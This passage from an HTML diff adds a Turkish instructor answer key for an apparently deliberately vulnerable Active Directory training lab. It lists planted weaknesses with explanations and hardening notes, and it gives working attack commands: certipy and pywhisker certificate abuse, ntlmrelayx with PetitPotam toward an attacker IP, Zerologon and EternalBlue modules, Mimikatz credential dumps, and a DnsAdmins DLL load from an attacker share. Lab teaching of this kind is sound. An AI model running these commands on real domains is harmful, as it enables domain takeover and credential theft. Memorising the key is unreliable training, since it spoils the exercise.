+</blockquote>
+<h3 id="84-esc7-ca-rol-acli">8.4 ESC7 — CA rol ACL'i</h3>
+<p>Rastgele bir Normal-tier grup, <code>ManageCA</code> + <code>ManageCertificates</code> sahibidir.</p>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> CA yönetim hakları; grubun zafiyetli template açmasına, bekleyen istekleri onaylamasına ya da enrollment agent eklemesine izin verir — PKI'nin idari kontrolü.</p>
+</blockquote>
+<h3 id="85-esc8-web-enrollment-relay">8.5 ESC8 — Web Enrollment relay</h3>
+<p>HTTP Web Enrollment + LDAP signing/channel binding zorlanmıyor.</p>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> CA'nın HTTP enrollment endpoint'i NTLM kabul ediyor ve imzalama zorlanmıyor; böylece coerce edilmiş bir DC kimlik doğrulaması <code>/certsrv</code>'ye <strong>relay</strong> edilip DC sertifikası alınır → DCSync. (LLMNR/broadcast poisoning kullanılmaz — tetikleyici coercion'dır.)</p>
+</blockquote>
+<h3 id="86-certifried-cve-2022-26923">8.6 Certifried (CVE-2022-26923)</h3>
+<p><code>MAQ=10</code> + Enterprise CA (<code>generate.log</code> → READY).</p>
+<pre><code class="language-bash">certipy account create -u &lt;user&gt;@phantom.local -p '&lt;pass&gt;' -dc-ip &lt;DC-IP&gt; -user 'EVIL$' -pass 'Evil1234!' -dns DC1.phantom.local
+certipy req -u 'EVIL$'@phantom.local -p 'Evil1234!' -dc-ip &lt;DC-IP&gt; -ca &lt;CA-NAME&gt; -template Machine
+certipy auth -pfx dc01.pfx -dc-ip &lt;DC-IP&gt;
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> MachineAccountQuota&gt;0 herhangi bir kullanıcının bilgisayar hesabı oluşturmasına izin verir ve bu hesabın <code>dNSHostName</code>'i DC'nin FQDN'iyle aynı yapılabilir. CA da KDC'nin DC kimliğine eşlediği bir makine sertifikası verir.</p>
+</blockquote>
+<h3 id="87-shadow-credentials">8.7 Shadow Credentials</h3>
+<p>Rastgele bir IT Helpdesk kullanıcısı, rastgele bir IT Admins kullanıcısı üzerinde <code>GenericWrite</code> sahibidir.</p>
+<pre><code class="language-bash">pywhisker -d phantom.local -u &lt;low&gt; -p '&lt;pass&gt;' --target &lt;high&gt; --action add
+certipy auth -pfx &lt;high&gt;.pfx -dc-ip &lt;DC-IP&gt;
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> <code>GenericWrite</code>, hedefin <code>msDS-KeyCredentialLink</code>'ine kendi anahtarını yazmanı sağlar; sonra hedef olarak PKINIT yaparsın — parola sıfırlama gerekmez, force-change'den daha sessizdir.</p>
+</blockquote>
+<hr />
+<h2 id="9-coercion-relay-kaynag">9. Coercion (relay kaynağı)</h2>
+<p>Print Spooler (MS-RPRN / PrinterBug) + MS-EFSRPC (PetitPotam) açık.</p>
+<pre><code class="language-bash">impacket-ntlmrelayx -t http://&lt;DC-IP&gt;/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
+python3 PetitPotam.py &lt;ATTACKER-IP&gt; &lt;DC-IP&gt;     # ya da printerbug.py
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> MS-RPRN/MS-EFSRPC, uzaktaki bir host'u saldırganın seçtiği bir hedefe geri kimlik doğrulamaya zorlayan RPC metodları sunar. Bu kimlik doğrulama relay edilebilir (ör. ESC8'e).</p>
+</blockquote>
+<hr />
+<h2 id="10-network-cveler">10. Network CVE'ler</h2>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Nerede</th>
+<th>Yol</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2020-1472 <strong>Zerologon</strong></td>
+<td>Netlogon; 14393.693 &lt; 3866 → <strong>zafiyetli</strong></td>
+<td><code>nxc smb &lt;DC-IP&gt; -M zerologon</code> → boş makine parolası → <code>secretsdump -no-pass</code>. <strong>Dersten sonra DC'yi reboot et.</strong></td>
+</tr>
+<tr>
+<td>MS17-010 <strong>EternalBlue</strong></td>
+<td>SMBv1; 14393.693 &lt; 953 → <strong>zafiyetli</strong></td>
+<td>msf <code>exploit/windows/smb/ms17_010_eternalblue</code> (hedef: Server 2016)</td>
+</tr>
+<tr>
+<td>CVE-2014-6287 <strong>HFS 2.3</strong></td>
+<td><code>C:\HFS\hfs.exe</code>, port 8080, SYSTEM</td>
+<td>msf <code>exploit/windows/http/rejetto_hfs_exec</code> → SYSTEM</td>
+</tr>
+</tbody>
+</table>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> <strong>Zerologon</strong> — Netlogon'un AES-CFB8 kullanımındaki hata, sıfır-IV bir hesaplamayla DC makine parolasının sıfırlanmasına izin verir. <strong>EternalBlue</strong> — SMBv1'deki bellek bozulması hatası (yamasız). <strong>HFS 2.3</strong> — null-byte template injection RCE verir; servis SYSTEM olarak çalıştığı için tam kontroldür.</p>
+</blockquote>
+<hr />
+<h2 id="11-local-privilege-escalation">11. Local privilege escalation</h2>
+<table>
+<thead>
+<tr>
+<th>Vektör</th>
+<th>Detay</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unquoted service path</td>
+<td><code>VulnUpdateSvc</code> → <code>C:\Program Files\Vuln Update Service\</code> (Authenticated Users: Modify)</td>
+</tr>
+<tr>
+<td>AlwaysInstallElevated</td>
+<td><code>HKLM</code> <strong>ve</strong> <code>HKCU</code> <code>...\Installer = 1</code></td>
+</tr>
+<tr>
+<td>Writable scheduled task</td>
+<td><code>SystemMaintenanceCleanup</code> → herkese yazılabilir <code>C:\Users\Public\Maintenance\cleanup.bat</code> (SYSTEM)</td>
+</tr>
+<tr>
+<td>Autologon</td>
+<td><code>svc_deploy</code> / <code>Deploy2024!</code> (Winlogon düz metin)</td>
+</tr>
+<tr>
+<td>GPP cpassword</td>
+<td><code>LocalAdmin</code> / <code>LocalAdmin2024!</code> (SYSVOL <code>Groups.xml</code>, <code>gpp-decrypt</code>)</td>
+</tr>
+<tr>
+<td>LAPS-style</td>
+<td><code>WKSTN01/02</code>, <code>SRV-FILE01</code>, <code>SRV-APP01</code>, <code>LAPTOP-CEO</code> local-admin parolasını <code>info</code> attribute'ta tutar</td>
+</tr>
+</tbody>
+</table>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> <strong>unquoted path</strong> — Windows, boşluk içeren yolu bölüp senin exe'ni yazılabilir bir ara klasörden çalıştırır. <strong>AlwaysInstallElevated</strong> — politika her <code>.msi</code>'yi SYSTEM olarak kurar. <strong>Writable task</strong> — SYSTEM görevinin betiği herkese yazılabilir bir konumda. <strong>GPP cpassword</strong> — Microsoft sabit AES anahtarını yayınladı, dolayısıyla SYSVOL <code>cpassword</code>'ü kolayca çözülür. <strong>LAPS-style</strong> — local-admin parolası, düşük-tier bir grubun okuyabildiği bir attribute'ta.</p>
+</blockquote>
+<hr />
+<h2 id="115-bellekteki-kimlikler">11.5 Bellekteki kimlikler (Mimikatz / C2 ödülü)</h2>
+<p>Client olmayan bir lab'da kimse logon olmaz, yani <code>sekurlsa::logonpasswords</code> normalde boş döner. Bu yüzden ayrıcalıklı bir servis hesabı sürekli logon olacak şekilde ayarlandı — bir sunucuda iş çalıştıran Domain Admin servis hesabı, gerçek hayatın en klasik bulgusu.</p>
+<table>
+<thead>
+<tr><th>Ek</th><th>Detay</th></tr>
+</thead>
+<tbody>
+<tr><td>Hesap</td><td><code>svc_backupadm</code> / <code>Backup#Adm2024!</code> — <strong>Domain Admins</strong> üyesi, parola hiç sona ermez</td></tr>
+<tr><td>Neden bellekte</td><td><code>BackupReportJob</code> zamanlanmış görevi bu hesapla her 10 dakikada bir çalışır</td></tr>
+<tr><td>WDigest</td><td><code>UseLogonCredential=1</code> → LSASS'te düz metin kimlik cache'lenir</td></tr>
+<tr><td>LSA secrets</td><td>Görevin sakladığı parola LSA secrets'a yazılır (zamanlamadan bağımsız)</td></tr>
+</tbody>
+</table>
+<pre><code class="language-bash"># DC'de SYSTEM olduktan sonra (local privesc / WinRM / HFS), Empire/Havoc ajanindan:
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords      # WDigest sayesinde duz metin
+mimikatz # lsadump::secrets              # zamanlanmis gorev parolasi, zamanlamadan bagimsiz
+# ya da zaten admin isen uzaktan:
+impacket-secretsdump -sam -security -system LOCAL phantom.local/&lt;admin&gt;@&lt;DC-IP&gt;
+</code></pre>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> bir servis hesabına Domain Admin yetkisi verilmiş ve bir domain controller'da zamanlanmış iş çalıştırmak için kullanılmış. İş her çalıştığında hesap makinede kimlik doğrular, dolayısıyla kimlik bilgisi LSASS'te durur; görevi kaydetmek parolayı LSA secrets'a da yazar. WDigest'in yeniden açılması cache'lenen kimliği geri alınabilir düz metne çevirir. O tek host'ta SYSTEM'e ulaşan herkes Domain Admin'i devralır.</p>
+</blockquote>
+<hr />
+<h2 id="12-kalclk-persistence-ve-dc-ele-gecirme">12. Kalıcılık (persistence) ve DC ele geçirme</h2>
+<table>
+<thead>
+<tr>
+<th>Teknik</th>
+<th>Ek</th>
+<th>İstismar</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Backup Operators</strong></td>
+<td>rastgele Marketing kullanıcısı</td>
+<td>DC'den <code>SAM</code>/<code>NTDS.dit</code> yedekle → offline <code>secretsdump</code> → DA</td>
+</tr>
+<tr>
+<td><strong>Server Operators</strong></td>
+<td>rastgele Sales kullanıcısı</td>
+<td>DC servis binary'sini değiştir → SYSTEM</td>
+</tr>
+<tr>
+<td><strong>DnsAdmins</strong></td>
+<td><code>&lt;dnsadmin_user&gt;</code> / <code>UberSecurePassword</code></td>
+<td><code>dnscmd /config /serverlevelplugindll \\attacker\dll</code> → DNS restart → SYSTEM</td>
+</tr>
+<tr>
+<td><strong>gMSA</strong></td>
+<td><code>svc_gmsa01</code>, IT Helpdesk okuyabilir</td>
+<td><code>ReadGMSAPassword</code> → hesabı kullan</td>
+</tr>
+<tr>
+<td><strong>GPO abuse</strong></td>
+<td><code>Workstation Hardening Policy</code> DC OU'da, bir Mid grup düzenleyebilir</td>
+<td><code>SharpGPOAbuse</code> → DC'de SYSTEM</td>
+</tr>
+<tr>
+<td><strong>AdminSDHolder</strong></td>
+<td><code>GenericAll</code> sahibi düşük yetkili kullanıcı</td>
+<td>SDProp kontrolü korumalı gruplara yayar (~60 dk)</td>
+</tr>
+<tr>
+<td><strong>DSRM</strong></td>
+<td><code>DsrmAdminLogonBehavior=2</code></td>
+<td><code>secretsdump</code> SAM → Administrator NTLM → PtH <code>--local-auth</code></td>
+</tr>
+<tr>
+<td><strong>Zayıf flag'ler</strong></td>
+<td><code>PASSWD_NOTREQD</code>, <code>DONT_EXPIRE_PASSWORD</code></td>
+<td>Enum/istismar hedefleri</td>
+</tr>
+</tbody>
+</table>
+<blockquote class="why"><p><strong>Neden oluşur:</strong> her biri aşırı yetkili ya da arka kapı bir konfigürasyon. <strong>Backup/Server Operators</strong> tasarım gereği DC'yi okuyabilir ya da üzerinde kod çalıştırabilir. <strong>DnsAdmins</strong> — DNS servisi SYSTEM olarak çalışır ve üye tarafından belirtilen bir DLL'i yükler. <strong>gMSA</strong> — parola-okuma hakkı fazla geniş bir gruba verilmiş. <strong>GPO</strong> — DC'ye bağlı bir politika düşük yetkililerce düzenlenebilir. <strong>AdminSDHolder</strong> — oradaki <code>GenericAll</code>, SDProp tarafından her korumalı gruba yeniden uygulanır (kalıcı). <strong>DSRM</strong> — local admin, Pass-the-Hash ile ağ üzerinden kullanılabilir hale gelir.</p>
+</blockquote>
+<hr />
+<h2 id="13-onerilen-kill-chainler">13. Önerilen kill-chain'ler</h2>
+<ol>
+<li><strong>Belgeler → foothold → roast → DA:</strong> null-session paylaşım → <code>svc_deploy</code> → Kerberoast → kır → ACL zinciri → DCSync.</li>
+<li><strong>CA yolu:</strong> herhangi bir kullanıcı → ESC1 (<code>SAN=Administrator</code>) → PKINIT → DCSync. (Ya da Certifried / ESC6 / ESC7.)</li>
+<li><strong>Delegation yolu:</strong> <code>websvc</code> → <code>CIFS/DC</code>'ye Administrator olarak S4U → <code>secretsdump</code>.</li>
+<li><strong>Coercion yolu:</strong> PetitPotam/PrinterBug → ESC8'e relay → DC sertifikası → DCSync.</li>
+<li><strong>DnsAdmins yolu:</strong> <code>Common\DNSrestart.ps1</code> breadcrumb → <code>&lt;dnsadmin_user&gt;</code> → serverlevelplugindll → SYSTEM.</li>
+</ol>
+<hr />
+<h2 id="14-blue-team-notlar">14. Blue-team notları</h2>
+<p>Her ek bir sıkılaştırma dersine karşılık gelir: SMB/LDAP signing ve channel binding'i zorla; NTLMv1/SMBv1'i kapat; <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>'yi kaldır ve template enroll/ACL'lerini kilitle; <code>MachineAccountQuota=0</code> yap; <code>DnsAdmins</code>, <code>Backup/Server Operators</code>, <code>AdminSDHolder</code> ve outbound-control ACL kenarlarını BloodHound ile denetle; Zerologon/EternalBlue'yu yamala; GPP cpassword ve herkese açık paylaşımları kaldır; kimlik bilgilerini asla autologon, SYSVOL ya da paylaşılan dokümanda tutma.</p>
+<hr />
+<p><em>Bu build'e ait gerçek rastgele kimlikler <code>generate.log</code> ve <code>VulnAD_Lab_Report.txt</code> dosyalarındadır.</em></p>
+    </section>
+    <div class="footer">Phantom AD · eğitmen cevap anahtarı · gerçek rastgele kimlikler generate.log ve VulnAD_Lab_Report.txt içinde</div>
+  </main>
+</div>
+</body>
+</html>
